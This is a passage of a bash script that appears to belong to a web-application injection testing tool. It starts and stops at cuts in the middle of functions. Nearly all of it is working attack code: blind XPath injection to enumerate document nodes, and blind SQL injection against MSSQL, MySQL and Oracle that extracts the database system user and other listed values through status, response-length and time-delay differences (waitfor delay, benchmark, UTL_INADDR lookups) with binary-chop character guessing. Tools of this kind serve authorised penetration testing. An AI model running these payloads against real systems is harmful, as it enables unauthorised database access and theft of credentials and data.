badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
max_position=6
max_name_length=10
for nodename in `cat ./payloads/nodenames.txt` ; do
#for nodename in `cat ./listofxpathelements.txt` ; do
	position=1
	if [[ "$nodename" == "child" ]] ; then
		max_position=6
	else
		max_position=2
	fi		
	while [[ $position -lt $max_position ]] ; do
		#echo -n "Node: $nodename Position: $position Node name: "
		#echo ""
		cflag=1
		abuf=''
		while [[ $cflag -lt $max_name_length ]] ; do
			for i in `cat ./payloads/alphabet.txt` ; do
				#always true:                                       #' or substring(name($nodename::*[position()=1]),$cflag,1)='$i' or 'a'='b
				badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$nodename%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d$position%5d%29%2c$cflag%2c%31%29%3d%27$i%27%20%6f%72%20%27%61%27%3d%27%62"`
				requester
				status_true=`echo $response | cut -d ":" -f 1`
				length_true=`echo $response | cut -d ":" -f 2`
				#echo "...73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c$cflag%2c%31%29%3d%27$i%27%20%6f%72%20%27%61%27%3d%27%62"
				((lendiff=$length_true-$length_false))
				if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
					echo -n "$i"
					abuf=$abuf$i
				fi
				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
					if [[ $lendiff == $storedlendiff ]] ; then			
						echo -n "$i"
						abuf=$abuf$i
					fi
				fi
			done
		((cflag=$cflag+1))
		done
	remessage="XPATH: Node $nodename Position $position Node name $abuf"
	echoreporter
	iu=''
	if [[ "$nodename" == "child" ]] ; then
		iu=".child node: ---"
	elif [[ "$nodename" == "self" ]] ; then
		iu="..self node: --"
	elif [[ "$nodename" == "parent" ]] ; then
		iu="parent node: -"
	fi

	echo $iu$abuf >> ./listofxpathnodes.txt
	((position=$position+1))
	done
done

cat ./listofxpathnodes.txt 2>/dev/null
cat ./listofxpathelements.txt 2>/dev/null
#cat ./listofxpathdata.txt 2>/dev/null
}
	
lettergrab()
{
echo "Trying status/length-based data extraction"

if [ true = "$Z" ] ; then echo "DEBUG! dbms: $dbms numerator: $numerator" ; fi 
# adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
# if we do, lets try em out again on this parameter
# if this fails, continue to re-run the full lettergrab() as normal...
# initalise a check flag:
check_flag=0 
if [[ "$nambuf" != "" ]] ; then
	echo "Trying credentials already found: $nambuf"
	#this determines the 'always wrong' reference request to suit the dbms:
	if [[ $dbms == "mssql" ]] ; then                            
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user = 'foobar') then 789 else 0 end)$end"`
	elif [[ $dbms == "mysql" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = 'foobar') then 789 else 0 end)$end"`
	elif [[ $dbms == "oracle" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = 'foobar' then 789 else 0 end$end"`
	else
		echo "Unable to determine DBMS"
	fi

	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester

	if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi

	status_false=`echo $response | cut -d ":" -f 1`
	length_false=`echo $response | cut -d ":" -f 2` 

	if [[ $dbms == "mssql" ]] ; then                            
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user = '$nambuf') then 789 else 0 end)$end"`
	elif [[ $dbms == "mysql" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = '$nambuf') then 789 else 0 end)$end"`
	elif [[ $dbms == "oracle" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = '$nambuf' then 789 else 0 end$end"`
	else
		echo "Unable to determine DBMS"
	fi
	if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi	
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending iflag $request"
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
	((lendiff=$length_true-$length_false))
	gotlength=0
	#first test: status response comparison
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		remessage="SYS USER IS: $nambuf"
		echoreporter
		check_flag=1
	fi
	#second test: length response comparison (note that we ignore results with < 6 chars difference)
	if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
		if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
		remessage="SYS USER IS: $nambuf"
		echoreporter
		check_flag=1
		fi
	fi
fi

if [[ "$timedelay" == "1" ]] ; then
	check_flag=1 #this is to skip this test and move to tmedelay
fi

if [[ "$check_flag" == "0" ]] ; then
echo "Reading in ./payloads/thingstoextractwhenblind.$dbms.txt to get data to extract. You could modify this file to extract other data..."
cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
	echo "Trying to extract: $findme"
	###get the length of the string
	horiz=40
	oflag=1
	while [[ $oflag -lt $horiz ]] ; do 
		#only need to send the reference request (below) once
		#this determines the 'always wrong' reference request to suit the dbms:
		if [[ $oflag == "1" ]] ; then 
			if [[ $dbms == "mssql" ]] ; then                            
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (len(system_user) = 999) then 789 else 0 end)$end"`
			elif [[ $dbms == "mysql" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then 789 else 0 end)$end"`
			elif [[ $dbms == "oracle" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
			else
				echo "Unable to determine DBMS"
				oflag=40
			fi
			encodeinput=$badparams
			encodeme
			badparams=$encodeoutput
			requester
			if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2` 
		fi
		
		if [[ $dbms == "mssql" ]] ; then                            
			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (len($findme) = $oflag) then 789 else 0 end)$end"`
		elif [[ $dbms == "mysql" ]] ; then
			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length($findme) = $oflag) then 789 else 0 end)$end"`
		elif [[ $dbms == "oracle" ]] ; then
			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length(($findme)) = $oflag then 789 else 0 end$end"`
		else
			echo "Unable to determine DBMS"
			oflag=40
		fi

		if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi
		
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		#echo "debug sending iflag $request"
		status_true=`echo $response | cut -d ":" -f 1`
		length_true=`echo $response | cut -d ":" -f 2`
			
		((lendiff=$length_true-$length_false))
		gotlength=0
		#first test: status response comparison
		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
			gotlength=1
			remessage="$findme STRING LENGTH = $oflag"
			echoreporter
			sysuserlen=$oflag
			oflag=40
		fi
		#second test: length response comparison (note that we ignore results with < 6 chars difference)
		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
			if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
				gotlength=1
				remessage="$findme STRING LENGTH = $oflag"
				echoreporter
				sysuserlen=$oflag
				oflag=40	
			fi
		fi
		((oflag=$oflag+1)) 
	done
	###
	if [[ $gotlength == 1 ]] ; then
		horiz=$sysuserlen #the length of the system user field in chars
		oflag=1 #outerloop counter - this tracks the letters guessed correctly
		#iflag=32 #innerloop counter - this tracks each letter guessed. init-ed to 32 at this is where valid chars start in the ascii index
		nambuf="" #an expading string buffer to store the reslts
		echo "Attempting to extract $findme. If you get bored hit CNTRL+c to skip. Please wait..."
		while [[ $oflag -le $horiz ]] ; do
			if [[ $oflag == "1" ]] ; then #this routine gets run once at the begining. it stores the always false response for comparison.
				if [[ $dbms == "mssql" ]] ; then                            
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring((select system_user),$oflag,1)) = 999) then 678 else 0 end)$end"`
				elif [[ $dbms == "mysql" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
				elif [[ $dbms == "oracle" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
				else
					echo "Unable to determine DBMS"
					oflag=40
					break
				fi
				encodeinput=$badparams
				encodeme
				badparams=$encodeoutput
				requester
				if [ true = "$Z" ] ; then echo "DEBUG! sending false $request" ;fi
				status_false=`echo $response | cut -d ":" -f 1`
				length_false=`echo $response | cut -d ":" -f 2`
			fi
			binrange=256
			asciinumber=128
			operation="ADD"
			for i in `cat ./payloads/binarychopvalues.txt` ; do
				itwo=$((i*2))
				segment=$((binrange/i))
				dc=$((binrange/itwo))

				if [[ $dbms == "mssql" ]] ; then                            
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring((select $findme),$oflag,1)) > $asciinumber) then 789 else 0 end)$end"`
					#echo "DEBUG! findme: $findme oflag: $oflag asciinumber: $asciinumber" 
				elif [[ $dbms == "mysql" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring($findme,$oflag,1)) > $asciinumber) then 789 else 0 end)$end"`
					#echo "DEBUG! findme: $findme oflag: $oflag asciinumber: $asciinumber"
				elif [[ $dbms == "oracle" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr(($findme),$oflag,1)) > $asciinumber then 789 else 0 end$end"`
				else
					echo "Unable to determine DBMS"
					oflag=40
					break
				fi
				encodeinput=$badparams
				encodeme
				badparams=$encodeoutput
				requester
				if [ true = "$Z" ] ; then echo "DEBUG! sending true $request" ;fi
				status_true=`echo $response | cut -d ":" -f 1`
				length_true=`echo $response | cut -d ":" -f 2`
				((lendiff=$length_true-$length_false))
				#if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
				#	decasciiconv
				#	echo -n "$output"
				#	nambuf="$nambuf$output"
				#if [ true = "$Z" ] ; then echo "DEBUG! MATCH on: $output $request" ;fi
				#found a bug where data extraction would fail as there was no actual status diff check
				# this catches situations where true and false response statuses are the same
				# we use length diffing:
				if [[ "$status_true" == "$status_false" ]] ; then
					if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
						operation="ADD"
						if [ true = "$Z" ] ; then echo "DEBUG! value is greater than $asciinumber";fi
					else
						operation="SUB"
						if [ true = "$Z" ] ; then echo "DEBUG! value is less than or equal to $asciinumber"; fi
					fi
				fi
				# this catches situations where true and false response statuses are different
				# we use status diffing:
				if [[ "$status_true" != "$status_false" ]] ; then
					if [[ "$status_true" == "200" ]] ; then
						operation="ADD"
						if [ true = "$Z" ] ; then echo "DEBUG! value is greater than $asciinumber";fi
					else
						operation="SUB"
						if [ true = "$Z" ] ; then echo "DEBUG! value is less than or equal to $asciinumber"; fi
					fi
				fi

				if [[ "$operation" == "ADD" ]] ; then
					asciinumber=$((asciinumber+dc))
					if [ true = "$Z" ] ; then echo "DEBUG! asciinumber is now $asciinumber"; fi
				elif [[ "$operation" == "SUB" ]] ; then
					asciinumber=$((asciinumber-dc))
					if [ true = "$Z" ] ; then echo "DEBUG! asciinumber is now $asciinumber"; fi
				fi	
			done #end of inner loop
			if [[ "$operation" == "ADD" ]] ; then
				asciinumber=$((asciinumber+1))
				if [ true = "$Z" ] ; then echo "DEBUG! asciinumber is now $asciinumber"; fi
			elif [[ "$operation" == "SUB" ]] ; then
				asciinumber=$((asciinumber))
				if [ true = "$Z" ] ; then echo "DEBUG! asciinumber is now $asciinumber"; fi
			fi	
			#echo "final amount is $asciinumber"
			decasciiconv
			echo -n "$output"
			nambuf="$nambuf$output"
			if [ true = "$Z" ] ; then echo "DEBUG! MATCH on: $output $request" ;fi
			((oflag=$oflag+1))	
		done	
		echo ""
		if [[ $nambuf != "" ]] ; then 
			remessage="$findme: $nambuf"
			echoreporter
			extract=1
		fi
	fi
done
#extra fi for end of checkflag if statement (this is just to avoid indenting all the above code by a tab):
fi

if [[ "$timedelay" == 1 ]] ; then
	#status/length diffing didnt work - lets try time based diffing:
	check_flag=0 #reset the flag back to 0
	lettergrabtimebased
fi

}


lettergrabtimebased()
{
echo "Trying time-based data extraction"
#this is the same as lettergrab, but its *time*, not length/status based
#currently have to hard-code the detection delay to 8 seconds as using a dynamic variable led to a weird bug...  
# currently only works for MSSQL
if [ true = "$Z" ] ; then echo "DEBUG! dbms: $dbms numerator: $numerator" ; fi 

# adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
# if we do, lets try em out again on this parameter
# if this fails, continue to re-run the full lettergrabtimebased() as normal...
# initalise a check flag:
check_flag=0 
if [[ "$nambuf" != "" ]] ; then
	echo "Trying credentials already found: $nambuf"
	#this determines the 'always wrong' reference request to suit the dbms:
	if [[ $dbms == "mssql" ]] ; then                            
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if system_user = '$nambuf' waitfor delay '0:0:0'$end"`
	elif [[ $dbms == "mysql" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = 'foobar') then 789 else 0 end)$end"`
	elif [[ $dbms == "oracle" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = 'foobar' then 789 else 0 end$end"`
	else
		echo "Unable to determine DBMS"
	fi

	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester

	if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi

	time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
	
	#echo "response: $response"	
	#echo "time of false response: $time_false"	

	if [[ $dbms == "mssql" ]] ; then                                       
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if system_user = '$nambuf' waitfor delay '0:0:8'$end"`
	elif [[ $dbms == "mysql" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = '$nambuf') then benchmark(10000000,MD5(1)) else 0 end)$end"`
	elif [[ $dbms == "oracle" ]] ; then 
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when (select user from dual) = '$nambuf' then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
	else
		echo "Unable to determine DBMS"
	fi
	if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi	
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester

	time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
	#echo "time of true response: $time_true"	

	#echo "debug sending iflag $request"
	((timediff=$time_true-$time_false))
	#time response comparison (note that we ignore results with < 3 secs difference)
	if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
	remessage="SYS USER IS: $nambuf"
	echoreporter
	check_flag=1
	fi
fi

if [[ "$check_flag" == "0" ]] ; then
echo "Reading in ./payloads/thingstoextractwhenblind.$dbms.txt to get data to extract. You could modify this file to extract other data..."
cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
	echo "Trying to extract: $findme"
	###get the length of the string
	horiz=40
	oflag=1
	while [[ $oflag -lt $horiz ]] ; do 
		#only need to send the reference request (below) once
		#this determines the 'always wrong' reference request to suit the dbms:
		if [[ $oflag == "1" ]] ; then 
			if [[ $dbms == "mssql" ]] ; then                            
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:0'$end"`
			elif [[ $dbms == "mysql" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then benchmark(10000000,MD5(1)) else 0 end)$end"`
			elif [[ $dbms == "oracle" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
			else
				echo "Unable to determine DBMS"
				oflag=40
			fi
			encodeinput=$badparams
			encodeme
			badparams=$encodeoutput
			requester
			if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi
		
			time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
	
		fi
	
		if [[ $dbms == "mssql" ]] ; then                                       
			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len($findme) = $oflag) waitfor delay '0:0:8'$end"`
		elif [[ $dbms == "mysql" ]] ; then
			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length($findme) = $oflag) then benchmark(10000000,MD5(1)) else 0 end)$end"`
		elif [[ $dbms == "oracle" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when length(($findme)) = $oflag then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
		else
			echo "Unable to determine DBMS"
			oflag=40
		fi
	
		if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi
			
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		#echo "debug sending iflag $request"
		time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
	
		#echo "debug sending iflag $request"
		((timediff=$time_true-$time_false))
		gotlength=0
		#echo "timediff=$timediff"	
		#time response comparison (note that we ignore results with < 3 secs difference)
		if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
			remessage="$findme STRING LENGTH = $oflag"
			echoreporter
			sysuserlen=$oflag
			oflag=40
			gotlength=1	
		fi
		((oflag=$oflag+1)) 
	done
	###
	if [[ $gotlength == 1 ]] ; then
		horiz=$sysuserlen #the length of the system user field in chars
		oflag=1 #outerloop counter - this tracks the letters guessed correctly
		#iflag=32 #innerloop counter - this tracks each letter guessed. init-ed to 32 at this is where valid chars start in the ascii index
		nambuf="" #an expading string buffer to store the reslts
		echo "Attempting to brute force $findme. If you get bored hit CNTRL+c to skip. Please wait..."
		while [[ $oflag -le $horiz ]] ; do
			for asciinumber in `cat ./payloads/letterlist.txt` ; do 
			if [[ $iflag == "32" && $oflag == "1" ]] ; then #this routine gets run once at the begining. it stores the always false response for 	comparison.
				if [[ $dbms == "mssql" ]] ; then                            
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring(system_user,$oflag,1))=$asciinumber waitfor delay '0:0:0'$end"`
				elif [[ $dbms == "mysql" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
				elif [[ $dbms == "oracle" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
				else
					echo "Unable to determine DBMS"
					oflag=40
					break
				fi
				encodeinput=$badparams
				encodeme
				badparams=$encodeoutput
				requester
				if [ true = "$Z" ] ; then echo "DEBUG! sending false $request" ;fi
				time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
			fi
			if [[ $dbms == "mssql" ]] ; then                                       
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring($findme,$oflag,1))=$asciinumber) waitfor delay '0:0:8'$end"`
			elif [[ $dbms == "mysql" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring($findme,$oflag,1)) = $asciinumber) then benchmark(10000000,MD5(1)) else 0 end)$end"`
			elif [[ $dbms == "oracle" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr(($findme),$oflag,1)) = $asciinumber then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
			else
				echo "Unable to determine DBMS"
				oflag=40
				break
			fi
			encodeinput=$badparams
			encodeme
			badparams=$encodeoutput
			requester
			if [ true = "$Z" ] ; then echo "DEBUG! sending true $request" ;fi
			time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
	
			#echo "debug sending iflag $request"
			((timediff=$time_true-$time_false))
			#echo "timediff=$timediff"
			#time response comparison (note that we ignore results with < 3 secs difference)
			if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
				decasciiconv
				echo -n "$output"
				nambuf="$nambuf$output"
				if [ true = "$Z" ] ; then echo "DEBUG! MATCH on: $output $request" ;fi
				break
			fi
			done #end of inner loop
			((oflag=$oflag+1))	
		done
		echo ""
		if [[ $nambuf != "" ]] ; then 
			remessage="$findme: $nambuf"
			echoreporter
			extract=1
		fi
	fi
done
#extra fi for end of checkflag if statement:
fi
}

lettergrabtimebasedbinarychop()
{
echo "Trying time-based data extraction"
#this is the same as lettergrab, but its *time*, not length/status based
#currently have to hard-code the detection delay to 8 seconds as using a dynamic variable led to a weird bug...  
# currently only works for MSSQL
if [ true = "$Z" ] ; then echo "DEBUG! dbms: $dbms numerator: $numerator" ; fi 

# adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
# if we do, lets try em out again on this parameter
# if this fails, continue to re-run the full lettergrabtimebased() as normal...
# initalise a check flag:
check_flag=0 
if [[ "$nambuf" != "" ]] ; then
	echo "Trying credentials already found: $nambuf"
	#this determines the 'always wrong' reference request to suit the dbms:
	if [[ $dbms == "mssql" ]] ; then                            
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if system_user = '$nambuf' waitfor delay '0:0:0'$end"`
	elif [[ $dbms == "mysql" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = 'foobar') then 789 else 0 end)$end"`
	elif [[ $dbms == "oracle" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = 'foobar' then 789 else 0 end$end"`
	else
		echo "Unable to determine DBMS"
	fi

	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester

	if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi

	time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
	
	#echo "response: $response"	
	#echo "time of false response: $time_false"	

	if [[ $dbms == "mssql" ]] ; then                                       
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if system_user = '$nambuf' waitfor delay '0:0:8'$end"`
	elif [[ $dbms == "mysql" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = '$nambuf') then benchmark(10000000,MD5(1)) else 0 end)$end"`
	elif [[ $dbms == "oracle" ]] ; then 
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when (select user from dual) = '$nambuf' then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
	else
		echo "Unable to determine DBMS"
	fi
	if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi	
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester

	time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
	#echo "time of true response: $time_true"	

	#echo "debug sending iflag $request"
	((timediff=$time_true-$time_false))
	#time response comparison (note that we ignore results with < 3 secs difference)
	if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
	remessage="SYS USER IS: $nambuf"
	echoreporter
	check_flag=1
	fi
fi

if [[ "$check_flag" == "0" ]] ; then
echo "Reading in ./payloads/thingstoextractwhenblind.$dbms.txt to get data to extract. You could modify this file to extract other data..."
cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
	echo "Trying to extract: $findme"
	###get the length of the string
	horiz=40
	oflag=1
	while [[ $oflag -lt $horiz ]] ; do 
		#only need to send the reference request (below) once
		#this determines the 'always wrong' reference request to suit the dbms:
		if [[ $oflag == "1" ]] ; then 
			if [[ $dbms == "mssql" ]] ; then                            
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:0'$end"`
			elif [[ $dbms == "mysql" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then benchmark(10000000,MD5(1)) else 0 end)$end"`
			elif [[ $dbms == "oracle" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
			else
				echo "Unable to determine DBMS"
				oflag=40
			fi
			encodeinput=$badparams
			encodeme
			badparams=$encodeoutput
			requester
			if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi
		
			time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
	
		fi
	
		if [[ $dbms == "mssql" ]] ; then                                       
			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len($findme) = $oflag) waitfor delay '0:0:8'$end"`
		elif [[ $dbms == "mysql" ]] ; then
			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length($findme) = $oflag) then benchmark(10000000,MD5(1)) else 0 end)$end"`
		elif [[ $dbms == "oracle" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when length(($findme)) = $oflag then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
		else
			echo "Unable to determine DBMS"
			oflag=40
		fi
	
		if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi
			
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		#echo "debug sending iflag $request"
		time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
	
		#echo "debug sending iflag $request"
		((timediff=$time_true-$time_false))
		gotlength=0
		#echo "timediff=$timediff"	
		#time response comparison (note that we ignore results with < 3 secs difference)
		if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
			remessage="$findme STRING LENGTH = $oflag"
			echoreporter
			sysuserlen=$oflag
			oflag=40
			gotlength=1	
		fi
		((oflag=$oflag+1)) 
	done
	###
	if [[ $gotlength == 1 ]] ; then
		horiz=$sysuserlen #the length of the system user field in chars
		oflag=1 #outerloop counter - this tracks the letters guessed correctly
		#iflag=32 #innerloop counter - this tracks each letter guessed. init-ed to 32 at this is where valid chars start in the ascii index
		nambuf="" #an expading string buffer to store the reslts
		echo "Attempting to brute force $findme. If you get bored hit CNTRL+c to skip. Please wait..."
		while [[ $oflag -le $horiz ]] ; do
			if [[ $oflag == "1" ]] ; then #this routine gets run once at the begining. it stores the always false response for 	comparison.
				if [[ $dbms == "mssql" ]] ; then                            
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring(system_user,$oflag,1))=$asciinumber waitfor delay '0:0:0'$end"`
				elif [[ $dbms == "mysql" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
				elif [[ $dbms == "oracle" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
				else
					echo "Unable to determine DBMS"
					oflag=40
					break
				fi
				encodeinput=$badparams
				encodeme
				badparams=$encodeoutput
				requester
				if [ true = "$Z" ] ; then echo "DEBUG! sending false $request" ;fi
				time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
			fi
			binrange=256
			asciinumber=128
			operation="ADD"
			#for asciinumber in `cat ./payloads/letterlist.txt` ; do 
			for i in `cat ./payloads/binarychopvalues.txt` ; do
				itwo=$((i*2))
				segment=$((binrange/i))
				dc=$((binrange/itwo))
				#echo "segment: $segment dc: $dc"

				if [[ $dbms == "mssql" ]] ; then                                       
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring($findme,$oflag,1))>$asciinumber) waitfor delay '0:0:8'$end"`
				elif [[ $dbms == "mysql" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring($findme,$oflag,1)) > $asciinumber) then benchmark(10000000,MD5(1)) else 0 end)$end"`
				elif [[ $dbms == "oracle" ]] ; then
					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr(($findme),$oflag,1)) > $asciinumber then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
				else
					echo "Unable to determine DBMS"
					oflag=40
					break
				fi
				encodeinput=$badparams
				encodeme
				badparams=$encodeoutput
				requester
				if [ true = "$Z" ] ; then echo "DEBUG! sending true $request" ;fi
				time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
	
				#echo "debug sending iflag $request"
				((timediff=$time_true-$time_false))
				#echo "timediff=$timediff"
				#time response comparison (note that we ignore results with < 3 secs difference)
				if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
					operation="ADD"
					#echo "value is greater than $asciinumber"
				else
					operation="SUB"
					#echo "value is less than or equal to $asciinumber"
				fi

				if [[ "$operation" == "ADD" ]] ; then
					asciinumber=$((asciinumber+dc))
				elif [[ "$operation" == "SUB" ]] ; then
					asciinumber=$((asciinumber-dc))
				fi	
			done #end of inner loop
			if [[ "$operation" == "ADD" ]] ; then
				asciinumber=$((asciinumber+1))
			elif [[ "$operation" == "SUB" ]] ; then
				asciinumber=$((asciinumber))
			fi	
